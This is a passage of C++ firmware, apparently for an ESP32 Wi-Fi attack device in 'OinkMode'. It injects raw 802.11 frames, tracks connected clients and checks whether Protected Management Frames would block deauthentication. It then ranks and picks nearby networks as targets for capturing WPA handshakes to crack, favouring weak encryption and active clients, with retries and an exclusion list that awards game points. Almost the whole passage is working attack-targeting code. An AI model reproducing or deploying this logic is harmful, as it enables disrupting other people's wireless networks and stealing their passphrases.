    assocReq[bodyOffset++] = 0x0C;  // 6 Mbps
    assocReq[bodyOffset++] = 0x12;  // 9 Mbps
    assocReq[bodyOffset++] = 0x18;  // 12 Mbps
    assocReq[bodyOffset++] = 0x24;  // 18 Mbps
    
    esp_wifi_80211_tx(WIFI_IF_STA, assocReq, bodyOffset, false);
}

void OinkMode::trackClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
    int netIdx = findNetwork(bssid);
    if (netIdx < 0) return;
    
    // Protect all network vector accesses with spinlock
    NetworkRecon::enterCritical();
    
    // Revalidate index after acquiring lock
    if (netIdx >= (int)networks().size()) {
        NetworkRecon::exitCritical();
        return;
    }
    
    DetectedNetwork& net = networks()[netIdx];
    uint32_t now = millis();
    
    // Check if client already tracked
    for (int i = 0; i < net.clientCount; i++) {
        if (memcmp(net.clients[i].mac, clientMac, 6) == 0) {
            net.clients[i].rssi = rssi;
            net.clients[i].lastSeen = now;
            net.lastClientSeen = now;
            NetworkRecon::exitCritical();
            return;
        }
    }
    
    // LRU eviction: if at capacity, evict stalest client (not seen in 30s)
    if (net.clientCount >= MAX_CLIENTS_PER_NETWORK) {
        int stalestIdx = -1;
        uint32_t oldestTime = now;
        for (int i = 0; i < net.clientCount; i++) {
            if (net.clients[i].lastSeen < oldestTime) {
                oldestTime = net.clients[i].lastSeen;
                stalestIdx = i;
            }
        }
        // Evict stale client (>30s old) to make room
        if (stalestIdx >= 0 && (millis() - oldestTime > 30000)) {
            net.clients[stalestIdx] = net.clients[net.clientCount - 1];
            net.clientCount--;
        } else {
            NetworkRecon::exitCritical();
            return;  // All clients fresh, give up
        }
    }
    
    // Add new client if room
    if (net.clientCount < MAX_CLIENTS_PER_NETWORK) {
        memcpy(net.clients[net.clientCount].mac, clientMac, 6);
        net.clients[net.clientCount].rssi = rssi;
        net.clients[net.clientCount].lastSeen = now;
        net.clientCount++;
        net.lastClientSeen = now;
    }
    NetworkRecon::exitCritical();
}

bool OinkMode::detectPMF(const uint8_t* payload, uint16_t len) {
    // Parse RSN IE to detect PMF (Protected Management Frames)
    // RSN IE starts with tag 0x30
    uint16_t offset = 36;  // After fixed beacon fields
    
    while (offset + 2 < len) {
        uint8_t tag = payload[offset];
        uint8_t tagLen = payload[offset + 1];
        
        if (offset + 2 + tagLen > len) break;
        
        if (tag == 0x30 && tagLen >= 8) {  // RSN IE
            // RSN IE structure: version(2) + group cipher(4) + pairwise count(2) + ...
            // RSN capabilities are at the end, look for MFPC/MFPR bits
            uint16_t rsnOffset = offset + 2;
            uint16_t rsnEnd = rsnOffset + tagLen;
            
            // Skip version (2), group cipher (4)
            rsnOffset += 6;
            if (rsnOffset + 2 > rsnEnd) break;
            
            // Pairwise cipher count and suites
            uint16_t pairwiseCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (pairwiseCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // AKM count and suites
            uint16_t akmCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (akmCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // RSN Capabilities (2 bytes)
            uint16_t rsnCaps = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            
            // IEEE 802.11-2016 standard:
            // Bit 6: MFPC (Management Frame Protection Capable)
            // Bit 7: MFPR (Management Frame Protection Required)
            bool mfpr = (rsnCaps >> 7) & 0x01;
            
            if (mfpr) {
                return true;  // PMF required - deauth won't work
            }
        }
        
        offset += 2 + tagLen;
    }
    
    return false;
}

int OinkMode::findNetwork(const uint8_t* bssid) {
    return NetworkRecon::findNetworkIndex(bssid);
}

bool OinkMode::hasHandshakeFor(const uint8_t* bssid) {
    NetworkRecon::enterCritical();
    bool result = false;
    for (const auto& hs : handshakes) {
        if (memcmp(hs.bssid, bssid, 6) == 0 && hs.isComplete()) {
            result = true;
            break;
        }
    }
    NetworkRecon::exitCritical();
    return result;
}

void OinkMode::updateTargetCache() {
    bool wasBusy = oinkBusy;
    oinkBusy = true;

    NetworkRecon::enterCritical();
    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
        const DetectedNetwork& net = networks()[targetIndex];
        strncpy(targetSSIDCache, net.ssid, 32);
        targetSSIDCache[32] = 0;
        targetClientCountCache = net.clientCount;
        targetHiddenCache = net.isHidden;
        memcpy(targetBssidCache, net.bssid, sizeof(targetBssidCache));
        targetCacheValid = true;
    } else {
        targetSSIDCache[0] = '\0';
        targetClientCountCache = 0;
        targetHiddenCache = false;
        memset(targetBssidCache, 0, sizeof(targetBssidCache));
        targetCacheValid = false;
    }
    NetworkRecon::exitCritical();

    oinkBusy = wasBusy;
}

void OinkMode::sortNetworksByPriority() {
    // Sort networks by attack priority:
    // 1. Has clients + no handshake + not PMF (highest priority)
    // 2. Weak auth (Open, WEP, WPA1) + no handshake
    // 3. WPA2 without PMF + no handshake
    // 4. Networks with handshake already (skip)
    // 5. PMF protected (can't attack)
    
    bool wasBusy = oinkBusy;
    oinkBusy = true;

    std::vector<DetectedNetwork> sorted;
    NetworkRecon::enterCritical();
    sorted = networks();
    NetworkRecon::exitCritical();

    uint32_t now = millis();
    std::sort(sorted.begin(), sorted.end(), [now](const DetectedNetwork& a, const DetectedNetwork& b) {
        // Calculate priority score (lower = higher priority)
        auto getPriority = [now](const DetectedNetwork& net) -> int {
            // Already have handshake - lowest priority
            if (net.hasHandshake) return 100;
            // PMF protected - can't attack
            if (net.hasPMF) return 99;
            // Open networks - no handshake to capture
            if (net.authmode == WIFI_AUTH_OPEN) return 98;
            if (net.cooldownUntil > now) return 97;
            
            int priority = 50;  // Base
            
            // Has clients = much higher priority (deauth more likely to work)
            if (net.clientCount > 0 &&
                net.lastClientSeen > 0 &&
                (now - net.lastClientSeen) <= CLIENT_RECENT_MS) {
                priority -= 30;
            } else if (net.clientCount > 0) {
                priority -= 10;
            }
            
            // Auth mode priority (weaker = higher priority for cracking)
            switch (net.authmode) {
                case WIFI_AUTH_WEP: priority -= 15; break;   // Deprecated, easy to crack
                case WIFI_AUTH_WPA_PSK: priority -= 10; break;  // Weak
                case WIFI_AUTH_WPA_WPA2_PSK: priority -= 5; break;
                case WIFI_AUTH_WPA2_PSK: priority += 0; break;  // Standard
                case WIFI_AUTH_WPA3_PSK: priority += 10; break;  // Usually has PMF
                default: break;
            }
            
            // Fewer attack attempts = higher priority (try new ones first)
            priority += net.attackAttempts * 5;
            
            // Strong signal = higher priority (more reliable)
            if (net.rssi > -50) priority -= 5;
            else if (net.rssi > -70) priority -= 2;
            
            return priority;
        };
        
        return getPriority(a) < getPriority(b);
    });

    NetworkRecon::enterCritical();
    networks().swap(sorted);

    // Revalidate target index after reordering
    if (targetIndex >= 0) {
        int foundIdx = -1;
        for (int i = 0; i < (int)networks().size(); i++) {
            if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                foundIdx = i;
                break;
            }
        }
        targetIndex = foundIdx;
        if (targetIndex < 0) {
            deauthing = false;
            channelHopping = true;
            memset(targetBssid, 0, 6);
        }
    }

    if (selectionIndex >= (int)networks().size()) {
        selectionIndex = networks().empty() ? 0 : (int)networks().size() - 1;
    }
    NetworkRecon::exitCritical();

    oinkBusy = wasBusy;
    updateTargetCache();
}

int OinkMode::getNextTarget() {
    // Smart target selection with retry logic
    // First pass: networks with clients, no handshake, attackAttempts < 3
    uint32_t now = millis();
    auto hasRecentClient = [now](const DetectedNetwork& net) {
        return net.clientCount > 0 &&
            net.lastClientSeen > 0 &&
            (now - net.lastClientSeen) <= CLIENT_RECENT_MS;
    };

    int result = -1;
    NetworkRecon::enterCritical();
    
    // #region agent log - H3 PMF detection check
    {
        static uint32_t lastTargetLog = 0;
        if (now - lastTargetLog > 2000) {
            lastTargetLog = now;
            int pmfCount = 0, validCount = 0, totalCount = (int)networks().size();
            for (int i = 0; i < totalCount && i < 10; i++) {
                if (networks()[i].hasPMF) pmfCount++;
                if (!networks()[i].hasPMF && !networks()[i].hasHandshake && networks()[i].authmode != WIFI_AUTH_OPEN && networks()[i].ssid[0] != 0) validCount++;
            }
            Serial.printf("[DBG-H3] getNextTarget total=%d pmf=%d valid=%d\n", totalCount, pmfCount, validCount);
        }
    }
    // #endregion

    for (int i = 0; i < (int)networks().size(); i++) {
        if (isExcluded(networks()[i].bssid)) continue;  // BOAR BRO - skip
        if (networks()[i].ssid[0] == 0) continue;  // Hidden network - skip (no SSID for cracking)
        if (networks()[i].cooldownUntil > now) continue;  // Cooldown active
        if (networks()[i].hasPMF) continue;
        if (networks()[i].hasHandshake) continue;
        if (networks()[i].authmode == WIFI_AUTH_OPEN) continue;  // Open = no handshake
        if (hasRecentClient(networks()[i]) && networks()[i].attackAttempts < 3) {
            result = i;
            break;
        }
    }
    
    if (result < 0) {
        // Second pass: any network without handshake, attackAttempts < 2
        for (int i = 0; i < (int)networks().size(); i++) {
            if (isExcluded(networks()[i].bssid)) continue;  // BOAR BRO - skip
            if (networks()[i].ssid[0] == 0) continue;  // Hidden network - skip (no SSID for cracking)
            if (networks()[i].cooldownUntil > now) continue;  // Cooldown active
            if (networks()[i].hasPMF) continue;
            if (networks()[i].hasHandshake) continue;
            if (networks()[i].authmode == WIFI_AUTH_OPEN) continue;
            if (networks()[i].attackAttempts < 2) {
                result = i;
                break;
            }
        }
    }
    
    if (result < 0) {
        // Third pass: retry networks with clients even if attempted before
        for (int i = 0; i < (int)networks().size(); i++) {
            if (isExcluded(networks()[i].bssid)) continue;  // BOAR BRO - skip
            if (networks()[i].ssid[0] == 0) continue;  // Hidden network - skip (no SSID for cracking)
            if (networks()[i].cooldownUntil > now) continue;  // Cooldown active
            if (networks()[i].hasPMF) continue;
            if (networks()[i].hasHandshake) continue;
            if (networks()[i].authmode == WIFI_AUTH_OPEN) continue;
            if (networks()[i].clientCount > 0) {
                result = i;
                break;
            }
        }
    }
    
    NetworkRecon::exitCritical();
    return result;  // -1 means no suitable targets
}

// ============ BOAR BROS - Network Exclusion ============

uint64_t OinkMode::bssidToUint64(const uint8_t* bssid) {
    uint64_t result = 0;
    for (int i = 0; i < 6; i++) {
        result = (result << 8) | bssid[i];
    }
    return result;
}

bool OinkMode::isExcluded(const uint8_t* bssid) {
    return boarBros.count(bssidToUint64(bssid)) > 0;
}

uint16_t OinkMode::getExcludedCount() {
    return boarBros.size();
}

uint16_t OinkMode::getFilteredCount() {
    return filteredCount;
}

bool OinkMode::loadBoarBros() {
    boarBros.clear();

    const char* boarPath = SDLayout::boarBrosPath();
    if (!SD.exists(boarPath)) {
        return true;
    }

    File f = SD.open(boarPath, FILE_READ);
    if (!f) {
        return false;
    }
    
    String line;
    line.reserve(128);  // Pre-allocate to reduce heap fragmentation
    while (f.available() && boarBros.size() < MAX_BOAR_BROS) {
        line = f.readStringUntil('\n');  // Reuses existing capacity
        line.trim();
        
        // Skip empty lines and comments
        if (line.length() == 0 || line.startsWith("#")) continue;
        
        // Format: AABBCCDDEEFF  Optional SSID comment
        // Parse first 12 hex chars as BSSID
        if (line.length() >= 12) {
            String hexBssid = line.substring(0, 12);
            hexBssid.toUpperCase();
            
            uint64_t bssid = 0;
            bool valid = true;
            for (int i = 0; i < 12; i++) {
                char c = hexBssid.charAt(i);
                uint8_t nibble;
                if (c >= '0' && c <= '9') nibble = c - '0';
                else if (c >= 'A' && c <= 'F') nibble = c - 'A' + 10;
                else { valid = false; break; }
                bssid = (bssid << 4) | nibble;
            }
            
            if (valid) {
                // Extract SSID from rest of line (after space)
                String ssid = "";
                if (line.length() > 13) {
                    ssid = line.substring(13);
                    ssid.trim();
                }
                boarBros[bssid] = ssid;
            }
        }
    }
    
    f.close();
    return true;
}

bool OinkMode::saveBoarBros() {
    // Delete existing file first to ensure clean overwrite (FILE_WRITE appends on ESP32)
    const char* boarPath = SDLayout::boarBrosPath();
    if (SD.exists(boarPath)) {
        if (!SD.remove(boarPath)) {
            SDLog::log("OINK", "Failed to remove old BOAR BROS file");
            return false;
        }
    }

    File f = SD.open(boarPath, FILE_WRITE);
    if (!f) {
        SDLog::log("OINK", "Failed to open BOAR BROS file for writing");
        return false;
    }
    
    if (f.println("# BOAR BROS - Networks to ignore") == 0) {
        SDLog::log("OINK", "Failed to write header to BOAR BROS file");
        f.close();
        return false;
    }
    f.println("# Format: BSSID (12 hex chars) followed by optional SSID");
    
    for (const auto& entry : boarBros) {
        uint64_t bssid = entry.first;
        const String& ssid = entry.second;
        
        // Convert uint64 back to hex string
        char hex[13];
        snprintf(hex, sizeof(hex), "%02X%02X%02X%02X%02X%02X",
                 (uint8_t)((bssid >> 40) & 0xFF),
                 (uint8_t)((bssid >> 32) & 0xFF),
                 (uint8_t)((bssid >> 24) & 0xFF),
                 (uint8_t)((bssid >> 16) & 0xFF),
                 (uint8_t)((bssid >> 8) & 0xFF),
                 (uint8_t)(bssid & 0xFF));
        
        if (ssid.length() > 0) {
            f.printf("%s %s\n", hex, ssid.c_str());
        } else {
            f.println(hex);
        }
    }
    
    f.close();
    return true;
}

void OinkMode::removeBoarBro(uint64_t bssid) {
    boarBros.erase(bssid);
    saveBoarBros();
}

// Inject fake network for stress testing (no RF)
void OinkMode::injectTestNetwork(const uint8_t* bssid, const char* ssid, uint8_t channel, int8_t rssi, wifi_auth_mode_t authmode, bool hasPMF) {
    if (!running) return;
    
    NetworkRecon::enterCritical();

    if (networks().size() >= 100) {
        NetworkRecon::exitCritical();
        return;  // Cap
    }
    if (!HeapGates::canGrow(HeapPolicy::kMinHeapForOinkNetworkAdd,
                            HeapPolicy::kMinFragRatioForGrowth)) {
        NetworkRecon::exitCritical();
        return;
    }
    
    // Check if already exists
    for (auto& net : networks()) {
        if (memcmp(net.bssid, bssid, 6) == 0) {
            // Update existing
            net.rssi = rssi;
            net.lastSeen = millis();
            net.beaconCount++;
            NetworkRecon::exitCritical();
            return;
        }
    }
    
    // Add new
    DetectedNetwork net = {0};
    memcpy(net.bssid, bssid, 6);
    if (ssid && ssid[0]) {
        strncpy(net.ssid, ssid, 32);
        net.ssid[32] = 0;
    }
    net.channel = channel;
    net.rssi = rssi;
    net.authmode = authmode;
    net.hasPMF = hasPMF;
    net.lastSeen = millis();
    net.beaconCount = 1;
    net.isTarget = false;
    net.hasHandshake = false;
    net.attackAttempts = 0;
    net.isHidden = (!ssid || ssid[0] == 0);
    net.clientCount = 0;
    net.lastClientSeen = 0;
    net.cooldownUntil = 0;
    
    try {
        networks().push_back(net);
    } catch (const std::bad_alloc&) {
        NetworkRecon::exitCritical();
        SDLog::log("OINK", "Failed to inject test network: out of memory");
        return;
    }
    NetworkRecon::exitCritical();
}

bool OinkMode::excludeNetwork(int index) {
    if (index < 0 || index >= (int)networks().size()) {
        return false;
    }
    if (boarBros.size() >= MAX_BOAR_BROS) {
        return false;
    }
    
    uint64_t bssid = bssidToUint64(networks()[index].bssid);
    
    // Check if already excluded
    if (boarBros.count(bssid) > 0) {
        return false;
    }
    
    // Store BSSID with SSID (use NONAME BRO for hidden networks)
    String ssid = String(networks()[index].ssid);
    if (ssid.length() == 0) ssid = "NONAME BRO";
    boarBros[bssid] = ssid;
    saveBoarBros();
    
    // Check if this is a mid-attack exclusion (mercy save) vs normal exclusion
    bool isMidAttack = (targetIndex == index && deauthing);
    
    // If this was the current attack target, abort the attack immediately
    if (targetIndex == index) {
        deauthing = false;
        channelHopping = true;
        targetIndex = -1;
        memset(targetBssid, 0, 6);
        autoState = AutoState::NEXT_TARGET;
        stateStartTime = millis();
    }
    
    // Award XP for BOAR BROS action
    if (isMidAttack) {
        XP::addXP(XPEvent::BOAR_BRO_MERCY);  // +15 XP - mid-attack mercy!
    } else {
        XP::addXP(XPEvent::BOAR_BRO_ADDED);  // +5 XP - normal exclusion
    }
    
    return true;
}

// Exclude network by BSSID directly (for use from other modes like SPECTRUM)
bool OinkMode::excludeNetworkByBSSID(const uint8_t* bssid, const char* ssidIn) {
    if (boarBros.size() >= MAX_BOAR_BROS) {
        return false;
    }
    
    uint64_t bssid64 = bssidToUint64(bssid);
    
    // Check if already excluded
    if (boarBros.count(bssid64) > 0) {
        return false;
    }
    
    // Store BSSID with SSID (use NONAME BRO for hidden/empty networks)
    String ssid = (ssidIn && ssidIn[0]) ? String(ssidIn) : "NONAME BRO";
    boarBros[bssid64] = ssid;
    saveBoarBros();
    
    // Award XP for BOAR BROS action
    XP::addXP(XPEvent::BOAR_BRO_ADDED);  // +5 XP
    
    return true;
}
